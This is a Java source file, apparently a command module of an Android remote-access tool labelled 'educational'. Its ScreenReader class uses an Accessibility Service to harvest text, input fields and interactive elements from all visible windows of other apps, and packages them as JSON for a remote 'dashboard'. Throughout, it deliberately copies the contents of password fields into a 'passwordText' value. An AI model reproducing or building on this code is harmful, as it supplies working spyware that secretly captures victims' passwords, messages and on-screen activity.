package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityWindowInfo;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.List;

/**
 * SCREEN READER - Read Screen Content
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * - Requires Accessibility Service
 * - Reads all visible UI elements
 * - Extracts text, buttons, inputs
 * 
 * USE CASES:
 * - Screen content analysis
 * - UI automation
 * - Accessibility testing
 */
public class ScreenReader {

    private AccessibilityService accessibilityService;

    public ScreenReader(AccessibilityService service) {
        this.accessibilityService = service;
    }

    /**
     * Find the root node of the foreground application window.
     * Uses getWindows() (API 21+) to scan all windows and pick the topmost
     * non-system application window, falling back to getRootInActiveWindow().
     */
    private AccessibilityNodeInfo getForegroundRoot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
                if (windows != null) {
                    // Prefer the active (focused) application window
                    for (AccessibilityWindowInfo w : windows) {
                        if (w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION && w.isActive()) {
                            AccessibilityNodeInfo r = w.getRoot();
                            if (r != null) return r;
                        }
                    }
                    // Fallback: first application window (highest z-order)
                    for (AccessibilityWindowInfo w : windows) {
                        if (w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION) {
                            AccessibilityNodeInfo r = w.getRoot();
                            if (r != null) return r;
                        }
                    }
                    // Last resort: any window with a root node
                    for (AccessibilityWindowInfo w : windows) {
                        AccessibilityNodeInfo r = w.getRoot();
                        if (r != null) return r;
                    }
                }
            } catch (Exception ignored) {}
        }
        return accessibilityService.getRootInActiveWindow();
    }

    /**
     * Collect root nodes from ALL visible windows so overlays, dialogs and
     * system UI pop-ups are included in a full screen read.
     */
    private List<AccessibilityNodeInfo> getAllWindowRoots() {
        List<AccessibilityNodeInfo> roots = new java.util.ArrayList<>();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo w : windows) {
                        AccessibilityNodeInfo r = w.getRoot();
                        if (r != null) roots.add(r);
                    }
                }
            } catch (Exception ignored) {}
        }
        if (roots.isEmpty()) {
            AccessibilityNodeInfo r = accessibilityService.getRootInActiveWindow();
            if (r != null) roots.add(r);
        }
        return roots;
    }

    // Cap elements per read_screen call — large accessibility trees (e.g. chat apps) can produce
    // hundreds of nodes, resulting in 100+ KB JSON that overwhelms slow 3G uplinks.
    private static final int MAX_ELEMENTS = 150;

    /**
     * Read all screen content — collects nodes from ALL visible windows so
     * overlays, dialogs, and system UI elements are never missed.
     */
    public JSONObject readScreen() {
        JSONObject result = new JSONObject();
        
        try {
            List<AccessibilityNodeInfo> roots = getAllWindowRoots();

            if (roots.isEmpty()) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            // Use the first (foreground) root for package/class metadata
            AccessibilityNodeInfo primaryRoot = roots.get(0);

            JSONObject screenData = new JSONObject();
            screenData.put("packageName", primaryRoot.getPackageName());
            screenData.put("className", primaryRoot.getClassName());
            
            // Read all elements across every window — capped at MAX_ELEMENTS for 3G safety
            JSONArray elements = new JSONArray();
            for (AccessibilityNodeInfo root : roots) {
                if (elements.length() >= MAX_ELEMENTS) break;
                readNodeRecursive(root, elements, 0);
                root.recycle();
            }
            
            screenData.put("elements", elements);
            screenData.put("elementCount", elements.length());
            if (elements.length() >= MAX_ELEMENTS) {
                screenData.put("truncated", true);
                screenData.put("note", "Element list capped at " + MAX_ELEMENTS + " for network efficiency");
            }

            result.put("success", true);
            result.put("screen", screenData);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Read node recursively — depth limit raised to 30 to capture deeply-nested layouts.
     * Hint text is also captured so placeholder/label text on inputs is never missed.
     */
    private void readNodeRecursive(AccessibilityNodeInfo node, JSONArray elements, int depth) {
        if (node == null || depth > 30) return;
        // Respect element cap — stop recursing once we hit the limit
        if (elements.length() >= MAX_ELEMENTS) return;
        
        try {
            JSONObject element = new JSONObject();
            
            // Basic info
            element.put("className", node.getClassName());
            element.put("depth", depth);
            
            // Text content
            if (node.getText() != null && node.getText().length() > 0) {
                element.put("text", node.getText().toString());
            }

            // Hint text (input placeholders, labels) — often the only readable text on empty fields
            CharSequence hint = node.getHintText();
            if (hint != null && hint.length() > 0) {
                element.put("hintText", hint.toString());
            }
            
            // Content description — key must match what the dashboard expects
            if (node.getContentDescription() != null && node.getContentDescription().length() > 0) {
                element.put("contentDescription", node.getContentDescription().toString());
            }
            
            // View ID
            if (node.getViewIdResourceName() != null) {
                element.put("viewId", node.getViewIdResourceName());
            }
            
            // Properties
            element.put("clickable", node.isClickable());
            element.put("focusable", node.isFocusable());
            element.put("editable", node.isEditable());
            element.put("scrollable", node.isScrollable());
            element.put("checkable", node.isCheckable());
            element.put("checked", node.isChecked());
            element.put("enabled", node.isEnabled());
            element.put("selected", node.isSelected());
            element.put("isPassword", node.isPassword());
            // For password fields, include the actual text from node (may be plain-text on many Android versions)
            if (node.isPassword() && node.getText() != null) {
                element.put("passwordText", node.getText().toString());
            }
            
            // Bounds
            android.graphics.Rect bounds = new android.graphics.Rect();
            node.getBoundsInScreen(bounds);
            JSONObject boundsObj = new JSONObject();
            boundsObj.put("left", bounds.left);
            boundsObj.put("top", bounds.top);
            boundsObj.put("right", bounds.right);
            boundsObj.put("bottom", bounds.bottom);
            element.put("bounds", boundsObj);

            // Only include nodes that have some visible content or are interactive
            boolean hasContent = node.getText() != null && node.getText().length() > 0
                || hint != null && hint.length() > 0
                || node.getContentDescription() != null && node.getContentDescription().length() > 0
                || node.isClickable()
                || node.isEditable()
                || node.isCheckable();
            if (hasContent || depth == 0) {
                elements.put(element);
            }
            
            // Read children
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    readNodeRecursive(child, elements, depth + 1);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Find elements by text
     */
    public JSONObject findByText(String text) {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = getForegroundRoot();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            java.util.List<AccessibilityNodeInfo> nodes = 
                rootNode.findAccessibilityNodeInfosByText(text);
            
            JSONArray matches = new JSONArray();
            
            for (AccessibilityNodeInfo node : nodes) {
                JSONObject match = new JSONObject();
                match.put("text", node.getText() != null ? node.getText().toString() : "");
                match.put("className", node.getClassName());
                match.put("clickable", node.isClickable());
                
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                JSONObject boundsObj = new JSONObject();
                boundsObj.put("left", bounds.left);
                boundsObj.put("top", bounds.top);
                boundsObj.put("right", bounds.right);
                boundsObj.put("bottom", bounds.bottom);
                match.put("bounds", boundsObj);
                
                matches.put(match);
                node.recycle();
            }

            rootNode.recycle();

            result.put("success", true);
            result.put("query", text);
            result.put("matches", matches);
            result.put("count", matches.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get current app info
     */
    public JSONObject getCurrentApp() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = getForegroundRoot();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            String packageName = rootNode.getPackageName() != null ? 
                rootNode.getPackageName().toString() : "unknown";
            
            String className = rootNode.getClassName() != null ? 
                rootNode.getClassName().toString() : "unknown";

            rootNode.recycle();

            result.put("success", true);
            result.put("packageName", packageName);
            result.put("className", className);
            
            // Get app name
            try {
                android.content.pm.PackageManager pm = accessibilityService.getPackageManager();
                android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
                String appName = pm.getApplicationLabel(appInfo).toString();
                result.put("appName", appName);
            } catch (Exception e) {
                result.put("appName", packageName);
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get all clickable elements
     */
    public JSONObject getClickableElements() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = getForegroundRoot();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            JSONArray clickables = new JSONArray();
            findClickableNodes(rootNode, clickables);

            rootNode.recycle();

            result.put("success", true);
            result.put("clickables", clickables);
            result.put("count", clickables.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Find clickable nodes recursively
     */
    private void findClickableNodes(AccessibilityNodeInfo node, JSONArray clickables) {
        findClickableNodes(node, clickables, 0);
    }

    private void findClickableNodes(AccessibilityNodeInfo node, JSONArray clickables, int depth) {
        if (node == null || depth > 10) return;
        
        try {
            if (node.isClickable()) {
                JSONObject clickable = new JSONObject();
                clickable.put("text", node.getText() != null ? node.getText().toString() : "");
                clickable.put("contentDescription", node.getContentDescription() != null ? 
                    node.getContentDescription().toString() : "");
                clickable.put("className", node.getClassName());
                
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                JSONObject boundsObj = new JSONObject();
                boundsObj.put("centerX", (bounds.left + bounds.right) / 2);
                boundsObj.put("centerY", (bounds.top + bounds.bottom) / 2);
                clickable.put("bounds", boundsObj);
                
                clickables.put(clickable);
            }
            
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findClickableNodes(child, clickables, depth + 1);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Get all input fields
     */
    public JSONObject getInputFields() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = getForegroundRoot();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            JSONArray inputs = new JSONArray();
            findInputNodes(rootNode, inputs);

            rootNode.recycle();

            result.put("success", true);
            result.put("inputs", inputs);
            result.put("count", inputs.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Find input nodes recursively
     */
    private void findInputNodes(AccessibilityNodeInfo node, JSONArray inputs) {
        findInputNodes(node, inputs, 0);
    }

    private void findInputNodes(AccessibilityNodeInfo node, JSONArray inputs, int depth) {
        if (node == null || depth > 10) return;
        
        try {
            if (node.isEditable()) {
                JSONObject input = new JSONObject();
                boolean isPass = node.isPassword();
                String rawText = node.getText() != null ? node.getText().toString() : "";
                input.put("text", rawText);
                input.put("hint", node.getHintText() != null ? node.getHintText().toString() : "");
                input.put("className", node.getClassName());
                input.put("isPassword", isPass);
                if (isPass && !rawText.isEmpty()) {
                    input.put("passwordText", rawText);
                }
                
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                JSONObject boundsObj = new JSONObject();
                boundsObj.put("centerX", (bounds.left + bounds.right) / 2);
                boundsObj.put("centerY", (bounds.top + bounds.bottom) / 2);
                input.put("bounds", boundsObj);
                
                inputs.put(input);
            }
            
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findInputNodes(child, inputs, depth + 1);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
